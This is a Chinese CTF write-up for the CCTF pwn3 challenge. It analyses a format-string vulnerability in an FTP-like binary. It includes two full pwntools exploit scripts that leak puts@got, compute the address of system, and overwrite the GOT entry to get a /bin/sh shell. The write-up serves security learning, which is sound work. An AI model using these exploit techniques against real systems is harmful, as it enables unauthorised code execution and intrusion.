
# [原创] CCTF_pwn3 题解

## cctf_pwn3 题解

这道题是一个格式化字符串漏洞的题，但是中间涉及的知识点还是挺多的，需要的思路也比较完善，是一个质量还挺高的题目，值得玩味一下。

### 题目的基本信息

![](upload/attach/201910/779730_P4P57PK8E5YTAA9.png)

从基本的程序信息上看，没有什么特殊的地方。运行程序，根据输入的结果，可以肯定对输入进行了验证处理，具体的功能和逻辑还需要看一下代码。

### IDA 查看源码

- `strings`查看一下是否有明显的字符串信息：

![](upload/attach/201910/779730_KCM8384EDF3VKFU.png)

从搜索到字符串来看，程序中存在几个高危函数，之所以考虑`printf`是预防一下格式化字符串漏洞的出现。

- `main`函数：

![](upload/attach/201910/779730_XSYZYG7YKB6E653.png)

从`main`函数来看，没有明显的问题，但是`main`函数下调用了几个其他的函数，依次进去查看一下。

- `ask_username()`函数：

![](upload/attach/201910/779730_PS8S4CZ83MBRZVE.png)

在这个函数里，我们发现`src`中是我们输入的`username`，然后下面的循环对`username`进行了处理：依次将`src`中的字符的`ascii`码进行`+1`的操作，完事之后copy到了`dest`中，没有发现后续的处理了，也没有发现条件判断和对比。既然对输入做了处理，那么就需要对输入进行判断，可能在其他函数中实现。

- `ask_password()`函数：

![](upload/attach/201910/779730_GMBBCECG72ZCUP5.png)

在这个函数中发现了对处理后的`username`进行的判断，判断是否与`"sysbdmin"`相等，然后返回`welcome`。

那我们可以使用下面的代码还原出正确的`username`：

```python
username = bytearray("sysbdmin")
for i in range(len(username)):
    username[i] -= 1
print username
```

最后得到的正确的`username`为`rxraclhm`。

重新输入正确的`username`，看程序反应：

![](upload/attach/201910/779730_P39MFBBF9QFU7B8.png)

ok，现在可以正常进入到程序流程了。继续回到 IDA 查看源码。

- `get_command()`函数：

![](upload/attach/201910/779730_4ZZG3XJ2DQWUEXZ.png)

在这个函数中我们看到对根据不同的输入执行不同的判断并返回不同的数值，而该函数是在进行完`username`后执行的，也就是这里期望我们输入的是`"get"`,`"put"`,`"dir"`这三个字符串。

- `put_file()`函数：

![](upload/attach/201910/779730_29N7KPU4FW9JHY9.png)

输入的字符串为`"put"`，就会执行到该函数，但看该函数的代码没有发现明显的问题，需要我们输入`file`的名字以及内容。

- `get_file()`函数：

![](upload/attach/201910/779730_YKFHHFCEEJJEEHM.png)

输入的字符串为`"get"`，就会执行到该函数。在该函数的代码中，主要是根据输入的`file`的名字来获取文件并输出内容，而且还调皮了一下判断是不是输入的`"flag"`。在输出的时候，`printf`函数有明显的格式化字符串漏洞，这里我们先记一下，有可能是主要的漏洞利用的地方。

- `show_dir()`函数：

![](upload/attach/201910/779730_3KJFXNSAANXMPK3.png)

输入的字符串为`"dir"`，就会执行到该函数。但是看函数代码，也没有发现特殊的地方。

根据上面对各个函数的代码的分析，我们总结一下：

该程序是一个类似 ftp 服务器的程序，可以输入`put|get|dir`三个命令。

1. `put`: 使用`malloc`分配 244 个字节，建立如以下数据结构，多次的`put`将形成一条链表。

```
struct _FILE {
    char filename[40];
    char content[200];
    struct _FILE *previous;
};
```

2. `get`: 要求先输入`filename`，然后遍历链表，匹配`filename`，找到则输出内容。找不到的话，是输出当前栈里的内容。

3. `dir`: 遍历链表，将所有的`filename`串起来输出。

在`put`函数中发现了一个明显的格式化字符串漏洞，那么我们就可以从这里入手，搞一波。

### 思路

1. 首先读取`puts@got`的内容，得到`puts`函数的地址，然后通过 `libc` 中偏移量固定的方式计算出`system`的地址

2. 将`system`地址写到`puts@got`里，替换掉`puts`函数

3. 让程序执行`puts('/bin/sh')`, 那么实际上执行的就是`system('/bin/sh')`

大体思路就是上面的思路，解题过程中遇到的坑在 exp 中进行说明。

### EXP

```python
#!/usr/bin/env python
from pwn import *
#context.log_level = 'debug'
elf = ELF('cctf_pwn3')
libc = ELF('/lib32/libc.so.6')
#没有远程环境了，直接本地测试
sh = process('./cctf_pwn3')
#这里直接输入了计算的正确的username
username = 'rxraclhm'
sh.recvuntil("Name (ftp.hacker.server:Rainism):")
sh.sendline(username)
# 根据前面的代码分析，不同的输入字符串返回不同的数字，进入不同的处理函数
# 分别构造程序的三个主函数
def put(sh,name,content):
    sh.sendlineafter("ftp>",'put')
    sh.sendlineafter("upload:",name)
    sh.sendlineafter("content:",content)

def get(sh,name,num):
    sh.sendlineafter("ftp>",'get')
    sh.sendlineafter("get:",name)
    return sh.recvn(num)

def dir(sh):
    sh.sendlineafter("ftp>",'dir')

# 获取puts函数的address
puts_plt = elf.symbols['puts']
print 'puts_plt= ' + hex(puts_plt)
puts_got = elf.got['puts']
print 'puts_got= ' + hex(puts_got)

# 获取system函数的地址
put(sh,'/sh','%8$s'+p32(puts_got))
text = get(sh,'/sh',4)
puts_addr = u32(text)
print 'puts_addr= ' + hex(puts_addr)

sys_addr = puts_addr - (libc.symbols['puts'] - libc.symbols['system'])
print 'sys_addr= ' + hex(sys_addr)

def cctf(name, address, num):
    num = num & 0xff
    if num == 0: num == 0x100
    payload = '%' + str(num) + 'c%10$hhn'
    payload = payload.ljust(12,'A')
    put(sh,name,payload+p32(address))
    get(sh,name,0)

# 拼接/bin，每次只写入一个字节（一次写太多崩溃了==）
cctf('n',puts_got,sys_addr)
cctf('i',puts_got+1,sys_addr>>8)
cctf('b',puts_got+2,sys_addr>>16)
cctf('/',puts_got+3,sys_addr>>24)

# system("/bin/sh")
dir(sh)
sh.interactive()
```

对格式化字符串偏移的计算：

![](upload/attach/201910/779730_P3RK4KN54GHQ5VU.png)

执行结果，成功获取拿到 shell：

![](upload/attach/201910/779730_BJCEVMSR582FMS6.png)

## 总结

1. 直接覆写的时候本来直接用`%n`直接一次写 4 个字节，但测试发现由于要输出太多字符，程序崩了。然后只能使用`%hhn`一次只写一个字节，分四次写入。

2. 如果要写的数字刚好是 0，那么可以换成 256。这是因为会发生溢出，最后的值仍然是 0。有了这个认识，那么可以做到在一次`printf`里使用多次`%hhn`写多个字节。（这是后来看一个师傅的 wp 发现的，我觉得挺厉害的！）

3. 确定 `libc` 版本可以使用 `LibcSearcher`，这是做完之后才发现的，下次试试。

4. 这道题做起来感觉挺爽的，一开始死活找不到合适的思路（主要还是自己太菜了 T T），但是后来灵光乍现突然想到可以这么做，最后在拼接`"/bin/sh"`的时候还是碰壁了，想了半天才想到每次只写一个字节进去，经验不够啊。总的来说，这道题比较适合学习格式化字符串，痛并快乐着～

#### 最后给出一个使用 LibcSearcher 的 EXP

```python
from pwn import *
from LibcSearcher import LibcSearcher
#context.log_level = 'debug'
pwn3 = ELF('./pwn3')
if args['REMOTE']:
    sh = remote('111', 111)
else:
    sh = process('./pwn3')

def get(name):
    sh.sendline('get')
    sh.recvuntil('enter the file name you want to get:')
    sh.sendline(name)
    data = sh.recv()
    return data

def put(name, content):
    sh.sendline('put')
    sh.recvuntil('please enter the name of the file you want to upload:')
    sh.sendline(name)
    sh.recvuntil('then, enter the content:')
    sh.sendline(content)

def show_dir():
    sh.sendline('dir')

tmp = 'sysbdmin'
name = ""
for i in tmp:
    name += chr(ord(i) - 1)

# password
def password():
    sh.recvuntil('Name (ftp.hacker.server:Rainism):')
    sh.sendline(name)

password()

# get the addr of puts
puts_got = pwn3.got['puts']
log.success('puts got : ' + hex(puts_got))
put('1111', '%8$s' + p32(puts_got))
puts_addr = u32(get('1111')[:4])

# get addr of system
libc = LibcSearcher("puts", puts_addr)
system_offset = libc.dump('system')
puts_offset = libc.dump('puts')
system_addr = puts_addr - puts_offset + system_offset
log.success('system addr : ' + hex(system_addr))

# modify puts@got, point to system_addr
payload = fmtstr_payload(7, {puts_got: system_addr})
put('/bin/sh;', payload)
sh.recvuntil('ftp>')
sh.sendline('get')
sh.recvuntil('enter the file name you want to get:')
#gdb.attach(sh)
sh.sendline('/bin/sh;')

# system('/bin/sh')
show_dir()
sh.interactive()
```
